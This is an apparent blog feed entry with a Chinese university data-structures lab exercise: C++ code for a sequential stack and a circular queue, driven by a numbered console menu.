    <content type="html"><![CDATA[<hr><h1 id="实验性质：验证性实验"><a href="#实验性质：验证性实验" class="headerlink" title="实验性质：验证性实验"></a>实验性质：验证性实验</h1><h1 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h1><p>（1）编程实现栈的以下基本操作：建栈，取栈顶元素，入栈，出栈。<br>（2）编程实现队列的以下基本操作：建队列，取队头元素，入队，出队。</p><h1 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h1><p>（1）掌握栈的顺序存储结构、链式存储结构及其基本操作；<br>（2）掌握队列的顺序存储结构、链式存储结构及其基本操作。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="keyword">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//顺序栈的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="keyword">int</span> v)</span></span>;<span class="comment">//顺序栈的入栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//删除栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(SqStack S)</span></span>; <span class="comment">//取栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayS</span><span class="params">(SqStack S)</span></span>;    <span class="comment">//显示顺序栈元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>; <span class="comment">//循环队列的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,<span class="keyword">int</span> v)</span></span>; <span class="comment">//循环队列的入队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;   <span class="comment">//循环队列的出队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHead</span><span class="params">(SqQueue Q)</span></span>;    <span class="comment">//取循环队列的队头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayQ</span><span class="params">(SqQueue Q)</span></span>;    <span class="comment">//显示循环队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    Menu();</span><br><span class="line">    InitStack(S);</span><br><span class="line">    SqQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="keyword">int</span> v,i;    <span class="comment">//插入元素的数值和操作代码</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v;</span><br><span class="line">            Push(S,v);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Pop(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            GetTop(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            DisplayS(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v;</span><br><span class="line">            EnQueue(Q,v);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            GetHead(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            DisplayQ(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            system(<span class="string">"cls"</span>);</span><br><span class="line">            Menu();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//顺序栈的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    S.base=<span class="keyword">new</span> SElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"存储分配失败"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        S.top=S.base;   <span class="comment">//top初始化为base,空栈</span></span><br><span class="line">        S.stacksize=MAXSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="keyword">int</span> v)</span><span class="comment">//顺序栈的入栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base==S.stacksize)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈已满"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *S.top++=v;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"入栈成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//删除栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈,无法出栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        --S.top;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"出栈成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(SqStack S)</span> <span class="comment">//取栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top!=S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"栈顶元素为:"</span>&lt;&lt;*(S.top<span class="number">-1</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayS</span><span class="params">(SqStack S)</span>    <span class="comment">//显示顺序栈元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"栈中元素为"</span>;</span><br><span class="line">        <span class="keyword">while</span>(S.top!=S.base)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;*--S.top&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span> <span class="comment">//循环队列的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.base=<span class="keyword">new</span> QElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"存储分配失败"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        Q.front=Q.rear=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,<span class="keyword">int</span> v)</span> <span class="comment">//循环队列的入队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE==Q.front)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列已满，无法插入"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q.base[Q.rear]=v;</span><br><span class="line">        Q.rear=(Q.rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"入队成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q)</span>   <span class="comment">//循环队列的出队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列为空，无法出队"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q.front=(Q.front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"出队成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHead</span><span class="params">(SqQueue Q)</span>    <span class="comment">//取循环队列的队头</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front!=Q.rear)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"队头为："</span>&lt;&lt;Q.base[Q.front]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayQ</span><span class="params">(SqQueue Q)</span>    <span class="comment">//显示循环队列元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front!=Q.rear)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(((Q.front+i)%MAXSIZE)!=Q.rear)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;Q.base[(Q.front+i)%MAXSIZE]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列为空"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"**by 夏日 https://blog.csdn.net/zss192**"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----顺序栈入栈"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----顺序栈出栈"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----取栈顶元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----显示顺序栈元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----循环队列入队"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----循环队列出队"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----取循环队列队头元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"8-----显示循环队列元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"9-----清屏"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;实验性质：验证性实验&quot;&gt;&lt;a href=&quot;#实验性质：验证性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：验证性实验&quot;&gt;&lt;/a&gt;实验性质：验证性实验&lt;/h1&gt;&lt;h1 id=&quot;要求：&quot;&gt;&lt;a href=&quot;#要求：&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
</feed>
